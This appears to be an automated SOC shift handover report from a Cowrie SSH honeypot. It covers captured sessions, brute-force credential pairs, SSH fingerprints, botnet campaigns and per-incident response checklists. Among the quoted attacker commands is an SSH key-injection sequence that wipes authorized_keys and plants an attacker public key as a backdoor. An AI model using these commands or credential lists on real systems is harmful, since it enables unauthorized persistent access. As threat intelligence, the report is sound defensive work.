# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-14 |
| **Generated At** | 2026-07-14T21:04:56Z |
| **Shift Time** | 21:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **146** |
| Confirmed Threats | **131** |
| False Positives Filtered | **15** (10.3%) |
| Unique Attacker IPs | **65** |
| Countries of Origin | **21** |
| High Severity Cases | **64** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **82** |
| Malware Samples Analyzed | **3** HIGH · **33** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **86** |
| Unique Credential Pairs | **47** |
| Unique Usernames | **13** |
| Unique Passwords | **46** |
| Successful Auth Pairs | **69** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 43 |
| `admin` | 15 |
| `user` | 9 |
| `ubnt` | 3 |
| `support` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 6 |
| `user99` | 5 |
| `smo@@kkklss` | 4 |
| `ucs1122` | 4 |
| `LeitboGi0ro` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 6 |
| `user` | `user99` | 5 |
| `root` | `smo@@kkklss` | 4 |
| `admin` | `ucs1122` | 4 |
| `root` | `LeitboGi0ro` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `tomcat` | `t0mc4t` | `185.242.3.195` | 2026-07-14T18:56:40 |
| `user` | `ubuntu1234567` | `10.0.0.73` | 2026-07-14T18:56:56 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-14T18:59:23 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-14T18:59:24 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-14T19:04:16 |
| `root` | `` | `45.90.163.37` | 2026-07-14T19:04:48 |
| `ubnt` | `00` | `220.80.223.144` | 2026-07-14T19:05:20 |
| `root` | `Root@123` | `211.253.10.61` | 2026-07-14T19:06:09 |
| `ubnt` | `00` | `65.20.251.41` | 2026-07-14T19:08:54 |
| `ubnt` | `00` | `10.0.0.73` | 2026-07-14T19:09:13 |
| `root` | `Root@123` | `10.0.0.73` | 2026-07-14T19:10:04 |
| `support` | `support` | `176.53.159.196` | 2026-07-14T19:11:05 |
| `support` | `support` | `10.0.0.73` | 2026-07-14T19:12:24 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-14T19:21:13 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-14T19:21:13 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-14T19:21:17 |
| `root` | `123qweasd` | `112.31.167.120` | 2026-07-14T19:29:49 |
| `admin` | `ucs1122` | `111.171.127.190` | 2026-07-14T19:30:21 |
| `admin` | `ucs1122` | `218.29.196.162` | 2026-07-14T19:30:30 |
| `centos` | `centos1234567` | `203.110.233.225` | 2026-07-14T19:31:42 |
| `centos` | `centos1234567` | `62.192.226.83` | 2026-07-14T19:31:49 |
| `root` | `daniel` | `185.242.3.195` | 2026-07-14T19:32:51 |
| `admin` | `ucs1122` | `136.56.34.147` | 2026-07-14T19:33:48 |
| `admin` | `ucs1122` | `10.0.0.73` | 2026-07-14T19:34:13 |
| `ts3server` | `12345678` | `106.92.55.35` | 2026-07-14T19:45:15 |
| `root` | `Admin2024@` | `117.34.85.169` | 2026-07-14T19:45:27 |
| `root` | `daniel` | `10.0.0.73` | 2026-07-14T19:46:39 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `103.72.147.224` | 2026-07-14T19:51:32 |
| `service` | `service` | `95.79.57.221` | 2026-07-14T19:55:10 |
| `root` | `8888888888` | `182.156.35.238` | 2026-07-14T19:55:45 |
| `root` | `8888888888` | `101.13.1.58` | 2026-07-14T19:55:59 |
| `admin` | `Password` | `39.164.94.190` | 2026-07-14T19:57:00 |
| `root` | `t00r` | `70.120.203.193` | 2026-07-14T19:58:12 |
| `345gs5662d34` | `345gs5662d34` | `70.120.203.193` | 2026-07-14T19:58:14 |
| `root` | `3245gs5662d34` | `70.120.203.193` | 2026-07-14T19:58:14 |
| `service` | `service` | `60.166.8.174` | 2026-07-14T19:58:33 |
| `root` | `8888888888` | `122.166.253.226` | 2026-07-14T19:59:16 |
| `admin` | `Password` | `175.207.233.24` | 2026-07-14T20:00:34 |
| `admin` | `Password` | `10.0.0.73` | 2026-07-14T20:00:58 |
| `tidb` | `password123456` | `45.198.224.92` | 2026-07-14T20:15:26 |
| `root` | `rootpass` | `41.231.85.75` | 2026-07-14T20:20:41 |
| `root` | `rootpass` | `121.179.93.147` | 2026-07-14T20:20:50 |
| `user` | `user99` | `119.200.229.33` | 2026-07-14T20:22:27 |
| `user` | `user99` | `36.93.154.207` | 2026-07-14T20:22:37 |
| `admin` | `1qazXSW@` | `121.189.226.81` | 2026-07-14T20:23:47 |
| `root` | `rootpass` | `10.0.0.73` | 2026-07-14T20:24:33 |
| `user` | `user99` | `197.242.170.10` | 2026-07-14T20:25:39 |
| `caojinzhou` | `caojinzhou` | `185.242.3.195` | 2026-07-14T20:25:55 |
| `user` | `user99` | `10.0.0.73` | 2026-07-14T20:25:59 |
| `root` | `adidas` | `2.58.172.185` | 2026-07-14T20:31:26 |
| `root` | `123qwerty` | `92.118.39.71` | 2026-07-14T20:33:19 |
| `root` | `21` | `92.118.39.71` | 2026-07-14T20:34:56 |
| `tidb` | `password123456` | `10.0.0.73` | 2026-07-14T20:35:21 |
| `root` | `321` | `92.118.39.71` | 2026-07-14T20:36:32 |
| `root` | `4321` | `92.118.39.71` | 2026-07-14T20:38:09 |
| `root` | `54321` | `92.118.39.71` | 2026-07-14T20:39:42 |
| `caojinzhou` | `caojinzhou` | `10.0.0.73` | 2026-07-14T20:39:51 |
| `root` | `P4ssw0rd` | `92.118.39.71` | 2026-07-14T20:41:14 |
| `root` | `P4ssword` | `92.118.39.71` | 2026-07-14T20:42:45 |
| `root` | `P@ssw0rd` | `92.118.39.71` | 2026-07-14T20:44:20 |
| `root` | `Passw0rd` | `92.118.39.71` | 2026-07-14T20:45:56 |
| `user` | `qwerty` | `50.223.176.171` | 2026-07-14T20:47:22 |
| `root` | `letmein` | `92.118.39.71` | 2026-07-14T20:47:23 |
| `root` | `p4ssword` | `92.118.39.71` | 2026-07-14T20:48:50 |
| `user` | `password321` | `10.0.0.73` | 2026-07-14T20:49:16 |
| `root` | `p@ssw0rd` | `92.118.39.71` | 2026-07-14T20:50:21 |
| `root` | `passw0rd` | `92.118.39.71` | 2026-07-14T20:51:52 |
| `root` | `password` | `92.118.39.71` | 2026-07-14T20:53:25 |
| `root` | `qwerty` | `92.118.39.71` | 2026-07-14T20:54:52 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **146** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 27 |
| Go SSH scanner | 24 |
| libssh | 12 |
| Paramiko (Python) | 10 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 25 | 24 |
| `2ec37a7cc8da...` | Mirai/variant | 16 | 1 |
| `a2de0f306611...` | Mirai/variant | 10 | 2 |
| `16443846184e...` | Generic scanner | 7 | 3 |
| `f555226df196...` | Mirai/variant | 4 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 25 | 24 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 16 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 10 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 7 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `f555226df196...` | libssh | 4 | 2 | Mirai/variant |
| `9052c4ab4164...` | OpenSSH | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 15 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `45.90.163.37`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `70.120.203.193`, `117.34.85.169`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **65** |
| Unique ASNs | **43** |
| High-Risk ASNs | **38** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 6 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS396982` | Google LLC | 4 | LOW |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS47890` | UNMANAGED LTD | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (64)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fb93bbf387af

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-14 18:56 |
| **Last Seen** | 2026-07-14 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:56:40` | `cowrie.session.connect` |
| `2026-07-14 18:56:40` | `cowrie.client.version` |
| `2026-07-14 18:56:40` | `cowrie.client.kex` |
| `2026-07-14 18:56:40` | `cowrie.login.success` |
| `2026-07-14 18:56:41` | `cowrie.session.params` |
| `2026-07-14 18:56:41` | `cowrie.command.input` |
| `2026-07-14 18:56:41` | `cowrie.log.closed` |
| `2026-07-14 18:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a610516ecf3

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-14 18:59 |
| **Last Seen** | 2026-07-14 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:59:22` | `cowrie.session.connect` |
| `2026-07-14 18:59:22` | `cowrie.client.version` |
| `2026-07-14 18:59:22` | `cowrie.client.kex` |
| `2026-07-14 18:59:23` | `cowrie.login.success` |
| `2026-07-14 18:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc4bb4054370

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-14 18:59 |
| **Last Seen** | 2026-07-14 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:59:23` | `cowrie.session.connect` |
| `2026-07-14 18:59:23` | `cowrie.client.version` |
| `2026-07-14 18:59:23` | `cowrie.client.kex` |
| `2026-07-14 18:59:24` | `cowrie.login.success` |
| `2026-07-14 18:59:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a10e03ba3e80

| Field | Detail |
|---|---|
| **Source IP** | `45.90.163[.]37` |
| **First Seen** | 2026-07-14 19:04 |
| **Last Seen** | 2026-07-14 19:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:04:47` | `cowrie.session.connect` |
| `2026-07-14 19:04:48` | `cowrie.login.success` |
| `2026-07-14 19:04:48` | `cowrie.session.params` |
| `2026-07-14 19:04:49` | `cowrie.command.input` |
| `2026-07-14 19:04:49` | `cowrie.command.input` |
| `2026-07-14 19:04:50` | `cowrie.command.input` |
| `2026-07-14 19:04:50` | `cowrie.command.input` |
| `2026-07-14 19:04:50` | `cowrie.command.failed` |
| `2026-07-14 19:04:51` | `cowrie.log.closed` |
| `2026-07-14 19:04:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.90.163[.]37` to AbuseIPDB if not already reported
- [ ] Block `45.90.163[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-524d065d7f48

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-07-14 19:05 |
| **Last Seen** | 2026-07-14 19:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:05:16` | `cowrie.session.connect` |
| `2026-07-14 19:05:17` | `cowrie.client.version` |
| `2026-07-14 19:05:17` | `cowrie.client.kex` |
| `2026-07-14 19:05:20` | `cowrie.login.success` |
| `2026-07-14 19:05:21` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dbcfea41360

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-14 19:06 |
| **Last Seen** | 2026-07-14 19:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:06:06` | `cowrie.session.connect` |
| `2026-07-14 19:06:07` | `cowrie.client.version` |
| `2026-07-14 19:06:07` | `cowrie.client.kex` |
| `2026-07-14 19:06:09` | `cowrie.login.success` |
| `2026-07-14 19:06:09` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5234a2574db8

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-07-14 19:08 |
| **Last Seen** | 2026-07-14 19:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:08:51` | `cowrie.session.connect` |
| `2026-07-14 19:08:52` | `cowrie.client.version` |
| `2026-07-14 19:08:52` | `cowrie.client.kex` |
| `2026-07-14 19:08:54` | `cowrie.login.success` |
| `2026-07-14 19:08:54` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fb2c747d95e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-14 19:11 |
| **Last Seen** | 2026-07-14 19:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:11:04` | `cowrie.session.connect` |
| `2026-07-14 19:11:04` | `cowrie.client.version` |
| `2026-07-14 19:11:04` | `cowrie.client.kex` |
| `2026-07-14 19:11:05` | `cowrie.login.success` |
| `2026-07-14 19:11:05` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:11:05` | `cowrie.direct-tcpip.data` |
| `2026-07-14 19:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8abb124b5d3a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-14 19:21 |
| **Last Seen** | 2026-07-14 19:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:21:13` | `cowrie.session.connect` |
| `2026-07-14 19:21:13` | `cowrie.client.version` |
| `2026-07-14 19:21:13` | `cowrie.client.kex` |
| `2026-07-14 19:21:13` | `cowrie.login.success` |
| `2026-07-14 19:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80c3aaf4493d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-14 19:21 |
| **Last Seen** | 2026-07-14 19:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:21:13` | `cowrie.session.connect` |
| `2026-07-14 19:21:13` | `cowrie.client.version` |
| `2026-07-14 19:21:13` | `cowrie.client.kex` |
| `2026-07-14 19:21:13` | `cowrie.login.success` |
| `2026-07-14 19:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c9d0821e6a3

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-14 19:21 |
| **Last Seen** | 2026-07-14 19:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:21:17` | `cowrie.session.connect` |
| `2026-07-14 19:21:17` | `cowrie.client.version` |
| `2026-07-14 19:21:17` | `cowrie.client.kex` |
| `2026-07-14 19:21:17` | `cowrie.login.success` |
| `2026-07-14 19:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-433f1d8ad673

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-14 19:21 |
| **Last Seen** | 2026-07-14 19:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:21:17` | `cowrie.session.connect` |
| `2026-07-14 19:21:17` | `cowrie.client.version` |
| `2026-07-14 19:21:17` | `cowrie.client.kex` |
| `2026-07-14 19:21:17` | `cowrie.login.success` |
| `2026-07-14 19:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbec56509083

| Field | Detail |
|---|---|
| **Source IP** | `112.31.167[.]120` |
| **First Seen** | 2026-07-14 19:29 |
| **Last Seen** | 2026-07-14 19:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:29:45` | `cowrie.session.connect` |
| `2026-07-14 19:29:46` | `cowrie.client.version` |
| `2026-07-14 19:29:46` | `cowrie.client.kex` |
| `2026-07-14 19:29:49` | `cowrie.login.success` |
| `2026-07-14 19:29:50` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.31.167[.]120` to AbuseIPDB if not already reported
- [ ] Block `112.31.167[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b581f8ab3a84

| Field | Detail |
|---|---|
| **Source IP** | `111.171.127[.]190` |
| **First Seen** | 2026-07-14 19:30 |
| **Last Seen** | 2026-07-14 19:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:30:18` | `cowrie.session.connect` |
| `2026-07-14 19:30:19` | `cowrie.client.version` |
| `2026-07-14 19:30:19` | `cowrie.client.kex` |
| `2026-07-14 19:30:21` | `cowrie.login.success` |
| `2026-07-14 19:30:22` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:30:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.127[.]190` to AbuseIPDB if not already reported
- [ ] Block `111.171.127[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33b79c1e370f

| Field | Detail |
|---|---|
| **Source IP** | `218.29.196[.]162` |
| **First Seen** | 2026-07-14 19:30 |
| **Last Seen** | 2026-07-14 19:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:30:28` | `cowrie.session.connect` |
| `2026-07-14 19:30:28` | `cowrie.client.version` |
| `2026-07-14 19:30:28` | `cowrie.client.kex` |
| `2026-07-14 19:30:30` | `cowrie.login.success` |
| `2026-07-14 19:30:31` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.29.196[.]162` to AbuseIPDB if not already reported
- [ ] Block `218.29.196[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2b1ce0f0f03

| Field | Detail |
|---|---|
| **Source IP** | `203.110.233[.]225` |
| **First Seen** | 2026-07-14 19:31 |
| **Last Seen** | 2026-07-14 19:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:31:39` | `cowrie.session.connect` |
| `2026-07-14 19:31:40` | `cowrie.client.version` |
| `2026-07-14 19:31:40` | `cowrie.client.kex` |
| `2026-07-14 19:31:42` | `cowrie.login.success` |
| `2026-07-14 19:31:42` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.110.233[.]225` to AbuseIPDB if not already reported
- [ ] Block `203.110.233[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0a9daaddc9f

| Field | Detail |
|---|---|
| **Source IP** | `62.192.226[.]83` |
| **First Seen** | 2026-07-14 19:31 |
| **Last Seen** | 2026-07-14 19:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
